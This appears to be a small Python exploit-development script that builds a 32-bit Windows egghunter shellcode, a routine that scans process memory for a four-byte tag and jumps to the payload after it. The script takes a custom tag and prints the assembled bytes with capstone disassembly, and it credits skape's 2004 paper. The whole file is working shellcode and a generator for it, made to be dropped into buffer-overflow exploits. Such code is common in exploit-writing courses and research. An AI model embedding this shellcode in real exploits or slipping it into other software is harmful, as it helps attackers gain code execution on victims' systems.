#!/usr/bin/python
# $Id: egghunter.py,v 1.0 2018/07/03 13:27:02 dhn Exp $

import sys
import argparse
import binascii
from capstone import *

# Reference: "Safely Searching Process Virtual Address Space"
# skape 2004 http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
shellcode = (
    "\x66\x81\xca\xff\x0f"    # or     dx,0xfff
    "\x42"                    # inc    edx
    "\x52"                    # push   edx
    "\x6a\x02"                # push   0x2
    "\x58"                    # pop    eax
    "\xcd\x2e"                # int    0x2e
    "\x3c\x05"                # cmp    al,0x5
    "\x5a"                    # pop    edx
    "\x74\xef"                # je     0x0
    "\xb8\x54\x30\x30\x57"    # mov    eax,0x57303054  egg = "T00W"
    "\x8b\xfa"                # mov    edi,edx
    "\xaf"                    # scas   eax,DWORD PTR es:[edi]
    "\x75\xea"                # jne    0x5
    "\xaf"                    # scas   eax,DWORD PTR es:[edi]
    "\x75\xe7"                # jne    0x5
    "\xff\xe7"                # jmp    edi
)

def opcode(code):
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    egghunter = ""
    for i in md.disasm(code, 0x1000):
        byte = binascii.hexlify(i.bytes)
        ascii_byte = "\\x".join(byte[i:i+2] \
                for i in range(0, len(byte), 2))

        egghunter += ('\t%-*s# %s\t%s\n' % (32, '"\\x'+ascii_byte+'"',
            i.mnemonic, i.op_str))
    return egghunter

def main(args):
    if len(args.egg) == 4:
        egghunter = shellcode[0:18] + \
                args.egg[::-1] + shellcode[22::]
    else:
        print("[!] The EGG signature is to long")
        sys.exit(1)

    print("[+] Egghunter length: %d bytes" % (len(egghunter)))
    print("egghunter = (\n%s\n)" % opcode(egghunter)[:-1])


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--egg", default="W00T")
    args = parser.parse_args()
    main(args)
